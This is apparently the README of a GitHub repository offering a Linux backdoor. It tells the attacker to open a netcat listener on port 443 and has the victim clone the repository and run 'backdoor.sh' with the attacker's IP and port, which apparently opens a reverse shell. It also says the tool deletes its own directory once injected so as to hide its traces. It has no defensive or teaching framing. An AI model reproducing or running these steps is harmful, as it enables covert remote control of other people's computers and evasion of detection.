# linux_backdoor

Usage : 

  ~ Attacker's PC ~
   
   nc -lvnp 443
   
  ~ Victim's PC ~

  git clone https://github.com/KingstonCyberSec/linux_backdoor.git
  
  cd linux_backdoor
  
  chmod +x *
  
  bash backdoor.sh <Attacker IP> <Port>
  
Images :

![github](https://user-images.githubusercontent.com/115974774/201770400-185f3e45-665a-45e7-95a3-1ed8ebc3614f.png)

Note : 

Once the backdoor is injected, it will automatically delete the linux_backdoor directory from the victim's PC.
  



